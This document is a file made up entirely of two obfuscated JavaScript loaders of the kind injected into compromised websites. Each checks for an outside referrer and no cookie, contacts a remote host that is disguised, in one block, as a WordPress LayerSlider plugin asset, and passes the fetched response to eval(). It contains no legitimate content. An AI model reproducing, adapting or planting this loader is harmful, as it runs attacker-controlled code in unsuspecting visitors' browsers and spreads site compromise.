;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};